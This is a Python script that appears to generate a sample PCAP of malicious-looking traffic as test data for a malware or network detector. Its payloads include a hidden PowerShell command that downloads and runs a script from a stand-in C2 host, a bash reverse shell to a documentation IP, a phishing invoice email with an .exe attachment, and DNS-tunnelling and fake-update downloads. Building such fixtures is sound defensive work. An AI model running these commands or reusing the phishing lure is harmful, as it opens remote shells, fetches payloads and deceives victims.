import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from tests.pcap_builder import (
    build_ethernet_frame,
    build_ipv4_packet,
    build_tcp_packet,
    build_udp_packet,
    create_pcap_file,
    make_dummy_pe,
)


def generate_sample_pcap(output_path: str = "sample_malware.pcap"):
    packets = []
    t = 1700000000.0

    pe_dropper = make_dummy_pe(
        payload_strings=[
            b"VirtualAllocEx",
            b"WriteProcessMemory",
            b"CreateRemoteThread",
            b"http://c2-beacon.darknet-ops.org/api/v1/heartbeat",
        ]
    )
    http_req = (
        b"GET /updates/security_patch.exe HTTP/1.1\r\n"
        b"Host: updates.microsoft-sysupdate.com\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        b"Accept: */*\r\n\r\n"
    )
    http_resp = (
        f"HTTP/1.1 200 OK\r\n"
        f"Content-Type: application/x-msdownload\r\n"
        f"Content-Disposition: attachment; filename=\"security_patch.exe\"\r\n"
        f"Content-Length: {len(pe_dropper)}\r\n\r\n"
    ).encode("ascii") + pe_dropper

    c_ip, s_ip = "192.168.1.105", "198.51.100.45"
    c_port, s_port = 49200, 80

    packets.append((t, build_ethernet_frame(build_ipv4_packet(c_ip, s_ip, 6, build_tcp_packet(c_port, s_port, 1000, 0, {"SYN": True}, b"")))))
    t += 0.005
    packets.append((t, build_ethernet_frame(build_ipv4_packet(s_ip, c_ip, 6, build_tcp_packet(s_port, c_port, 5000, 1001, {"SYN": True, "ACK": True}, b"")))))
    t += 0.005
    packets.append((t, build_ethernet_frame(build_ipv4_packet(c_ip, s_ip, 6, build_tcp_packet(c_port, s_port, 1001, 5001, {"ACK": True}, b"")))))
    t += 0.005
    packets.append((t, build_ethernet_frame(build_ipv4_packet(c_ip, s_ip, 6, build_tcp_packet(c_port, s_port, 1001, 5001, {"PSH": True, "ACK": True}, http_req)))))
    t += 0.015
    packets.append((t, build_ethernet_frame(build_ipv4_packet(s_ip, c_ip, 6, build_tcp_packet(s_port, c_port, 5001, 1001 + len(http_req), {"PSH": True, "ACK": True}, http_resp)))))
    t += 0.05

    smtp_malware = make_dummy_pe(
        payload_strings=[
            b"IsDebuggerPresent",
            b"CryptEncrypt",
            b"URLDownloadToFileA",
            b"http://malicious-gateway.cc/gate.php",
        ]
    )
    b64_attachment = base64.b64encode(smtp_malware).decode("ascii")

    smtp_data = (
        "EHLO workstation01.local\r\n"
        "MAIL FROM:<finance-billing@urgent-invoices.com>\r\n"
        "RCPT TO:<accounting@victim-corp.com>\r\n"
        "DATA\r\n"
        "From: \"Billing Dept\" <finance-billing@urgent-invoices.com>\r\n"
        "To: accounting@victim-corp.com\r\n"
        "Subject: Overdue Invoice #INV-98234 - Urgent Attention Required\r\n"
        "MIME-Version: 1.0\r\n"
        'Content-Type: multipart/mixed; boundary="====_BOUNDARY_12345_===="\r\n\r\n'
        "--====_BOUNDARY_12345_====\r\n"
        'Content-Type: text/plain; charset="utf-8"\r\n\r\n'
        "Please review the attached invoice immediately.\r\n\r\n"
        "--====_BOUNDARY_12345_====\r\n"
        'Content-Type: application/octet-stream; name="Invoice_Q3_Payment.exe"\r\n'
        'Content-Disposition: attachment; filename="Invoice_Q3_Payment.exe"\r\n'
        "Content-Transfer-Encoding: base64\r\n\r\n"
        f"{b64_attachment}\r\n"
        "--====_BOUNDARY_12345_====--\r\n"
        ".\r\n"
    ).encode("latin1")

    c_ip, s_ip = "192.168.1.110", "203.0.113.88"
    c_port, s_port = 51432, 25
    packets.append((t, build_ethernet_frame(build_ipv4_packet(c_ip, s_ip, 6, build_tcp_packet(c_port, s_port, 2000, 3000, {"PSH": True, "ACK": True}, smtp_data)))))
    t += 0.05

    raw_pe = make_dummy_pe(payload_strings=[b"WSAStartup", b"connect", b"cmd.exe"])
    xor_key = 0x5A
    xor_encoded = bytes([b ^ xor_key for b in raw_pe])

    c_ip, s_ip = "192.168.1.120", "198.51.100.99"
    c_port, s_port = 58912, 8443
    packets.append((t, build_ethernet_frame(build_ipv4_packet(s_ip, c_ip, 6, build_tcp_packet(s_port, c_port, 8000, 1000, {"PSH": True, "ACK": True}, xor_encoded)))))
    t += 0.05

    ps_payload = (
        b"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Exec Bypass -Command "
        b"\"IEX (New-Object System.Net.WebClient).DownloadString('http://c2-stage2.darknet.ru/stage2.ps1')\"\n"
    )
    c_ip, s_ip = "192.168.1.135", "198.51.100.77"
    c_port, s_port = 44556, 4444
    packets.append((t, build_ethernet_frame(build_ipv4_packet(c_ip, s_ip, 6, build_tcp_packet(c_port, s_port, 9000, 2000, {"PSH": True, "ACK": True}, ps_payload)))))
    t += 0.05

    dns_query_data = (
        b"\x12\x34"
        b"\x01\x00"
        b"\x00\x01"
        b"\x00\x00\x00\x00\x00\x00"
        b"\x1c7d9a8b1c4e2f90ab38c7128d99ef"
        b"\x05stage"
        b"\x08c2tunnel\x02io\x00"
        b"\x00\x10"
        b"\x00\x01"
    )
    c_ip, s_ip = "192.168.1.105", "8.8.8.8"
    c_port, s_port = 53535, 53
    packets.append((t, build_ethernet_frame(build_ipv4_packet(c_ip, s_ip, 17, build_udp_packet(c_port, s_port, dns_query_data)))))
    t += 0.05

    ftp_bash_script = b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/198.51.100.99/1337 0>&1\n"
    c_ip, s_ip = "192.168.1.140", "198.51.100.66"
    c_port, s_port = 48120, 20
    packets.append((t, build_ethernet_frame(build_ipv4_packet(s_ip, c_ip, 6, build_tcp_packet(s_port, c_port, 4000, 500, {"PSH": True, "ACK": True}, ftp_bash_script)))))

    create_pcap_file(output_path, packets)
    print(f"Generated sample PCAP: {output_path} ({len(packets)} packets)")


if __name__ == "__main__":
    out_file = sys.argv[1] if len(sys.argv) > 1 else "sample_malware.pcap"
    generate_sample_pcap(out_file)
